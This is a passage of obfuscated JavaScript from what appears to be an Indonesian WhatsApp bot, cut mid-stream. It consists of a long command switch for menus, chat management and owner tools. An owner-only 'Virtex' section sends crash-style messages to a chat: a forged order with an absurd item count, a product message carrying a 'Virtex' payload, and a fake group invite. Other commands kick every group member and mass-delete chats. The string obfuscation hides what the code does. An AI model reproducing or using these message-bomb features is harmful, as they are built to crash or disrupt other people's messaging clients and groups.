cekrows1=[{'title':_0x39f6c9(0x271),'description':_0x39f6c9(0x271),'rowId':'\x20'}],sectionscek2=[{'title':'Cek\x20Menu','rows':cekrows1}],buttoncek1={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0x182)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionscek2,'listType':0x1};client[_0x39f6c9(0x208)](from,buttoncek1,MessageType['listMessage'],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0x10e):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isGroup)return replysticker(grupstc);const gamerows1=[{'title':'Donasi','description':_0x39f6c9(0x271),'rowId':'\x20'}],sectionsgame1=[{'title':_0x39f6c9(0x10e),'rows':gamerows1}],buttongame1={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0x297)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsgame1,'listType':0x1};client[_0x39f6c9(0x208)](from,buttongame1,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':'PHOTO','thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0x1fc):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);const convertrows1=[{'title':_0x39f6c9(0x271),'description':_0x39f6c9(0x271),'rowId':'\x20'}],sectioncovnert1=[{'title':'Convert\x20Menu','rows':convertrows1}],buttonconvert1={'buttonText':'Click\x20Me!','footerText':ind['convertmenu'](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player['split']('@')[0x0]+_0x39f6c9(0x23f),'sections':sectioncovnert1,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonconvert1,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0x1e9):case _0x39f6c9(0xc6):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isGroup)return reply(_0x39f6c9(0x16b));if(isBanned)return replysticker(banstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());anug=getRegisteredRandomId(_registered)[_0x39f6c9(0x2a7)](_0x39f6c9(0xf3),'');const anugaaa=anug[_0x39f6c9(0x15b)]('@')[0x0]+'@s.whatsapp.net';reply('Looking\x20for\x20a\x20partner...'),sleep(0xbb8);const buttonsjodoh=[{'buttonId':_0x39f6c9(0x133),'buttonText':{'displayText':_0x39f6c9(0x1b4)},'type':0x1},{'buttonId':_0x39f6c9(0x29b),'buttonText':{'displayText':_0x39f6c9(0x246)},'type':0x1}],buttonMessagejodoh={'contentText':_0x39f6c9(0x16e)+prefix+'next*\x20—\x20find\x20a\x20new\x20partner\x0aUsername:'+pushname+'\x0a@'+anugaaa[_0x39f6c9(0x15b)]('@')[0x0],'footerText':_0x39f6c9(0x1af)+anug+_0x39f6c9(0x1e7)+numbernye[_0x39f6c9(0x15b)]('@')[0x0]+'*\x0a*Powered\x20By\x20@'+ow['split']('@')[0x0]+'*','buttons':buttonsjodoh,'headerType':0x6,'locationMessage':buttonloc2[_0x39f6c9(0x265)][_0x39f6c9(0xf5)]};client[_0x39f6c9(0x208)](from,buttonMessagejodoh,MessageType[_0x39f6c9(0x150)],{'quoted':mek,'contextInfo':{'sendEphemeral':!![],'mentionedJid':[anugaaa,numbernye,dev,ow]}}),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x166):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);const mode1343w=_0x39f6c9(0x214)+numbernye[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x173)+ow['split']('@')[0x0]+'*',mode1343=[{'buttonId':'public','buttonText':{'displayText':'Public'},'type':0x1},{'buttonId':_0x39f6c9(0x190),'buttonText':{'displayText':_0x39f6c9(0x2bd)},'type':0x1}];await sendButtonText(from,_0x39f6c9(0x2aa),mode1343w,mode1343,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});break;case _0x39f6c9(0xcc):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(!isGroup)return replysticker(grupstc);setTimeout(()=>{const _0x2740e4=_0x39f6c9;client[_0x2740e4(0x156)](from);},0x7d0),setTimeout(()=>{const _0x42545d=_0x39f6c9;client[_0x42545d(0x2c1)](from,Presence[_0x42545d(0x2ba)]),replysticker(leavestc);},0x0);break;case'List\x20Group':if(!isRegistered){if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});}if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);ingfoo=await getGroup(totalchat),teks1=_0x39f6c9(0x112)+ingfoo['length']+'\x0a\x0a';for(let i=0x0;i<ingfoo[_0x39f6c9(0x2cb)];i++){teks1+='•\x20Nama\x20grup\x20:\x20'+ingfoo[i][_0x39f6c9(0xb9)]+_0x39f6c9(0x1f4)+ingfoo[i]['id']+_0x39f6c9(0x1ef)+moment((''+ingfoo[i][_0x39f6c9(0xd8)])*0x3e8)['tz'](_0x39f6c9(0x2d5))[_0x39f6c9(0x280)](_0x39f6c9(0x176))+_0x39f6c9(0x16c)+ingfoo[i][_0x39f6c9(0x136)][_0x39f6c9(0x2cb)]+'\x0a\x0a';}sendButtonImageLoc(from,buttonsmenu5,teks1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x245):if(!isRegistered){if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});}if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);const virtrdrows22=[{'title':_0x39f6c9(0x23c),'description':_0x39f6c9(0x23c),'rowId':'\x20'},{'title':'Virtex\x20Troli','description':_0x39f6c9(0xf1),'rowId':'\x20'},{'title':_0x39f6c9(0xcf),'description':'Virtex\x20Catalog','rowId':'\x20'}],sectionsvirrt22=[{'title':'Tipe\x20Virtex','rows':virtrdrows22}],buttonvirtrut12={'buttonText':_0x39f6c9(0x209),'footerText':'*Support\x20Nekopoi.Care*\x0a*Offical\x20Bot\x20By\x20@'+numbernye[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x173)+ow['split']('@')[0x0]+'*','description':'*_Hai\x20@'+player['split']('@')[0x0]+'_*\x0a*_Pilih\x20Salah\x20Satu\x20Tipe\x20Virtex_*','sections':sectionsvirrt22,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonvirtrut12,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0x23c):if(!isRegistered){if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});}if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);buf=WMthumb,imeu=await client[_0x39f6c9(0x139)](_0x39f6c9(0x1ee),buf,image),imeg=imeu[_0x39f6c9(0x265)][_0x39f6c9(0x164)],res=await client[_0x39f6c9(0x210)](from,{'groupInviteMessage':{'groupJid':'85296556573-1328272333@g.us','inviteCode':_0x39f6c9(0x1d9),'inviteExpiration':_0x39f6c9(0x24f),'groupName':fake+_0x39f6c9(0x171)+vipi,'jpegThumbnail':WMthumb,'caption':_0x39f6c9(0x195),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':imeu,'contextInfo':{}}),client[_0x39f6c9(0x147)](res),await setTimeout(()=>{const _0x3e64e0=_0x39f6c9;reply(_0x3e64e0(0x240)+vipi);},0xbb8);break;case _0x39f6c9(0xf1):if(!isRegistered){if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});}if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);buf=WMthumb,imeu=await client[_0x39f6c9(0x139)]('0@s.whatsapp.net',buf,image),imeg=imeu[_0x39f6c9(0x265)][_0x39f6c9(0x164)],res=await client[_0x39f6c9(0x210)](from,{'orderMessage':{'orderId':_0x39f6c9(0xaa),'thumbnail':WMthumb,'itemCount':0xe8d4a51000,'status':_0x39f6c9(0x22f),'surface':_0x39f6c9(0x1b9),'orderTitle':_0x39f6c9(0x189),'message':_0x39f6c9(0x14e),'sellerJid':_0x39f6c9(0x2b2),'token':_0x39f6c9(0x152),'totalAmount1000':_0x39f6c9(0x23a),'totalCurrencyCode':_0x39f6c9(0x121),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':fakeitem,'contextInfo':{}}),client[_0x39f6c9(0x27f)](from,_0x39f6c9(0x10b)),client[_0x39f6c9(0x147)](res);break;case _0x39f6c9(0xcf):if(!isRegistered){if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});}if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);buf=WMthumb,imeu=await client[_0x39f6c9(0x139)]('0@s.whatsapp.net',buf,image),imeg=imeu['message'][_0x39f6c9(0x164)],res=await client[_0x39f6c9(0x210)](from,{'productMessage':{'product':{'productImage':imeg,'productId':_0x39f6c9(0xaa),'title':_0x39f6c9(0x14c)+vipi,'description':''+Virtex,'currencyCode':'IDR','priceAmount1000':_0x39f6c9(0xe7),'productImageCount':0x1},'businessOwnerJid':_0x39f6c9(0x2b2),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':fakeitem,'contextInfo':{}}),client['relayWAMessage'](res);break;case'Kick\x20All':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(!isGroup)return replysticker(grupstc);members_id=[],teks=args[_0x39f6c9(0x2cb)]>0x1?body['slice'](0x8)[_0x39f6c9(0xad)]():'',teks+='\x0a\x0a';for(let mem of groupMembers){teks+=_0x39f6c9(0x1ac)+mem[_0x39f6c9(0x11b)][_0x39f6c9(0x15b)]('@')[0x0]+'\x0a',members_id[_0x39f6c9(0x230)](mem[_0x39f6c9(0x11b)]);}mentions(teks,members_id,!![]),client[_0x39f6c9(0x27d)](from,members_id);break;case _0x39f6c9(0x120):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);var chats=await client[_0x39f6c9(0xb7)][_0x39f6c9(0x239)]();chats[_0x39f6c9(0x2d9)](async({jid:_0x47a253})=>{const _0x2f6236=_0x39f6c9;await client[_0x2f6236(0x163)](_0x47a253);}),replysticker(successtc),console[_0x39f6c9(0x1e5)](chats[_0x39f6c9(0x2cb)]);break;case _0x39f6c9(0x256):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);client[_0x39f6c9(0x15e)](from,ChatModification[_0x39f6c9(0xf7)],0x18*0x3c*0x3c*0x3e8),replysticker(successtc),console[_0x39f6c9(0x1e5)](_0x39f6c9(0x177)+from);break;case'Unmute':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);client[_0x39f6c9(0x15e)](from,ChatModification[_0x39f6c9(0x263)]),replysticker(successtc),console[_0x39f6c9(0x1e5)](_0x39f6c9(0x2c3)+from);break;case _0x39f6c9(0x273):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);client[_0x39f6c9(0x15e)](from,ChatModification[_0x39f6c9(0x18c)]),replysticker(successtc),console['log'](_0x39f6c9(0x11f)+from);break;case _0x39f6c9(0x170):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);client[_0x39f6c9(0x15e)](from,ChatModification['pin']),replysticker(successtc),console[_0x39f6c9(0x1e5)](_0x39f6c9(0x26f)+from);break;case _0x39f6c9(0xc7):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);var chats=await client[_0x39f6c9(0xb7)][_0x39f6c9(0x239)]();chats['map'](async({jid:_0x2f45b1})=>{const _0x3a7443=_0x39f6c9;await client[_0x3a7443(0x163)](_0x2f45b1,'unread');}),replysticker(successtc),console[_0x39f6c9(0x1e5)](chats[_0x39f6c9(0x2cb)]);break;case'UnArchive':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);replysticker(successtc),console[_0x39f6c9(0x1e5)](_0x39f6c9(0x290)+from),anu=await client[_0x39f6c9(0xb7)][_0x39f6c9(0x239)]();for(let _ of anu){client[_0x39f6c9(0x15e)](_[_0x39f6c9(0x11b)],ChatModification[_0x39f6c9(0x20c)]);}break;case _0x39f6c9(0x10f):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isOwner)return replysticker(ownerstc);const setmenurows=[{'title':_0x39f6c9(0x127),'description':_0x39f6c9(0x1e3),'rowId':'\x20'},{'title':_0x39f6c9(0x284),'description':_0x39f6c9(0x2ca),'rowId':'\x20'},{'title':'Menu\x20Katalog','description':_0x39f6c9(0x215),'rowId':'\x20'}],sectionssetmenu=[{'title':_0x39f6c9(0x10f),'rows':setmenurows}],buttonsetmenu={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0xa8)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionssetmenu,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonsetmenu,MessageType[_0x39f6c9(0xa1)],{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+'\x20Owner\x20Tersayang','body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0x127):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);mainmenu=![],sendButtonImageLoc(from,'\x20_Succses\x20mengganti\x20menu\x20ke\x20menu\x20ori_',buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x262):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);mainmenu=public,sendButtonImageLoc(from,_0x39f6c9(0x1b2),buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x284):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);mainmenu=!![],sendButtonImageLoc(from,_0x39f6c9(0x288),buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x2b3):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);replysticker(successtc),console[_0x39f6c9(0x1e5)](_0x39f6c9(0x126)+from),await sleep(0xbb8),client['modifyChat'](from,ChatModification[_0x39f6c9(0xfa)]);break;case'Delete\x20Pc':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);replysticker(successtc),console[_0x39f6c9(0x1e5)]('succes\x20delete\x20chat\x20=\x20'+from),await sleep(0xfa0),client[_0x39f6c9(0x15e)](from,ChatModification[_0x39f6c9(0x12a)]);break;case _0x39f6c9(0x155):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);anu=await client[_0x39f6c9(0xb7)][_0x39f6c9(0x239)](),client[_0x39f6c9(0x275)](0x63);for(let _ of anu){client['modifyChat'](_[_0x39f6c9(0x11b)],ChatModification['delete']);}replysticker(successtc);break;case _0x39f6c9(0x28d):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);let teksnyee='*LIST\x20STICKER\x20CMD*',cemde=[];for(let i of scommand){cemde[_0x39f6c9(0x230)](i['id']),teksnyee+=_0x39f6c9(0x299)+i['id']+_0x39f6c9(0x1b0)+i[_0x39f6c9(0xb7)];}sendButtonImageLoc(from,buttonsmenu5,teksnyee,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x184):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);let teksnyeee=_0x39f6c9(0x14a),rcemde=[];for(let i of commandsrespon){rcemde[_0x39f6c9(0x230)](i[_0x39f6c9(0x272)]),teksnyeee+=_0x39f6c9(0x299)+i[_0x39f6c9(0x272)]+'\x0a*•>\x20Cmd\x20:*\x20'+i[_0x39f6c9(0x292)];}sendButtonImageLoc(from,buttonsmenu5,teksnyeee,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x10a):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,ind['bahasa'](),buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x271):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x237)](prefix,player,ow,trakteer,saweria,donasi,rekening),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case'Profile':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(checkLimituser(sender)<=0x0)return reply(ind['limitend']());client[_0x39f6c9(0x2c1)](from,Presence['composing']);try{ppimg=await client[_0x39f6c9(0x270)](sender[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0xf3));}catch{ppimg=_0x39f6c9(0x2cc);}profile=_0x39f6c9(0x114)+pushname+_0x39f6c9(0x2be)+getLevelingXp(sender)+_0x39f6c9(0xd3)+getLevelingLevel(sender)+_0x39f6c9(0x1a4)+sender['split']('@')[0x0]+_0x39f6c9(0x224),buffer=await getBuffer(ppimg),client[_0x39f6c9(0x208)](from,buffer,image,{'quoted':mek,'caption':profile,'thumbnail':Buffer[_0x39f6c9(0xbf)](0x0)});break;case _0x39f6c9(0x2d0):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);client[_0x39f6c9(0x2c1)](from,Presence['composing']),teks=_0x39f6c9(0xe1);for(let block of blocked){teks+='├❏@'+block[_0x39f6c9(0x15b)]('@')[0x0]+'\x0a';}teks+='└❏\x20*Total:*\x20'+blocked[_0x39f6c9(0x2cb)],client[_0x39f6c9(0x208)](from,teks[_0x39f6c9(0xad)](),extendedText,{'quoted':fdoc,'contextInfo':{'mentionedJid':blocked}});break;case _0x39f6c9(0x28b):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);client[_0x39f6c9(0x2c1)](from,Presence['composing']);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});teks='*PREMIUM\x20LIST*\x20:\x0a';for(let premm of prem){teks+=_0x39f6c9(0x2c5)+premm['split']('@')[0x0]+'\x0a';}teks+='└❏\x20*Total:*\x20'+prem[_0x39f6c9(0x2cb)],client[_0x39f6c9(0x208)](from,teks[_0x39f6c9(0xad)](),extendedText,{'quoted':fdoc,'contextInfo':{'mentionedJid':prem}});break;case _0x39f6c9(0x1f0):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);let lbw='*BAD\x20WORD\x20LIST*\x0a';for(let i of bad){lbw+='├❏\x20'+i['replace'](bad)+'\x0a';}teks+=_0x39f6c9(0x1d0)+bad['length'],client[_0x39f6c9(0x208)](from,lbw[_0x39f6c9(0xad)](),extendedText,{'quoted':fdoc});break;case'List\x20Sticker':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);teks=_0x39f6c9(0x23b);for(let awokwkwk of setiker){teks+=_0x39f6c9(0x25f)+awokwkwk+'\x0a';}teks+=_0x39f6c9(0x1b7)+setiker[_0x39f6c9(0x2cb)]+_0x39f6c9(0x250),client['sendMessage'](from,teks['trim'](),extendedText,{'quoted':mek,'contextInfo':{'mentionedJid':setiker}});break;case _0x39f6c9(0x226):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);teks=_0x39f6c9(0xb6);for(let awokwkwk of videonye){teks+=_0x39f6c9(0x25f)+awokwkwk+'\x0a';}teks+='└❏\x20*Total\x20:\x20'+videonye['length']+_0x39f6c9(0x19a),client[_0x39f6c9(0x208)](from,teks['trim'](),extendedText,{'quoted':mek,'contextInfo':{'mentionedJid':videonye}});break;case _0x39f6c9(0x1dd):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);teks=_0x39f6c9(0xe5);for(let awokwkwk of imagenye){teks+='├❏\x20'+awokwkwk+'\x0a';}teks+='└❏\x20*Total\x20:\x20'+imagenye[_0x39f6c9(0x2cb)]+_0x39f6c9(0x19a),client[_0x39f6c9(0x208)](from,teks[_0x39f6c9(0xad)](),extendedText,{'quoted':mek,'contextInfo':{'mentionedJid':imagenye},'thumbnail':Buffer[_0x39f6c9(0xbf)](0x0)});break;case _0x39f6c9(0x1bd):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);teks=_0x39f6c9(0x17b);for(let awokwkwk of audionye){teks+=_0x39f6c9(0x25f)+awokwkwk+'\x0a';}teks+=_0x39f6c9(0x1b7)+audionye[_0x39f6c9(0x2cb)]+_0x39f6c9(0x17c),client[_0x39f6c9(0x208)](from,teks['trim'](),extendedText,{'quoted':mek,'contextInfo':{'mentionedJid':audionye}});break;case _0x39f6c9(0x1f3):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,antivirtexx(),buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x186):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,'Mau\x20jadi\x20bot\x20beli\x20jasan\x20run\x20bot\x20ketik\x20aja\x20owner\x20lalu\x20chat,\x20bisa\x20set\x20bot\x20semaumu',buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x125):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);const downloadrows1=[{'title':_0x39f6c9(0x271),'description':_0x39f6c9(0x271),'rowId':'\x20'}],sectionsdownl1=[{'title':_0x39f6c9(0x125),'rows':downloadrows1}],buttondownt1={'buttonText':'Click\x20Me!','footerText':ind['downloadmenu'](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player['split']('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsdownl1,'listType':0x1};client[_0x39f6c9(0x208)](from,buttondownt1,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case'Anti\x20Link':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isBotGroupAdmins)return replysticker(botadmstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(!isPremium)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());const mode134s3s1=[{'buttonId':'antilink\x20on','buttonText':{'displayText':'ON'},'type':0x1},{'buttonId':_0x39f6c9(0x268),'buttonText':{'displayText':_0x39f6c9(0xa2)},'type':0x1}];await sendButtonText(from,_0x39f6c9(0x2aa),buttonsmenu1,mode134s3s1,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}}),await confirmLIMIT(sender,[angka]);break;case 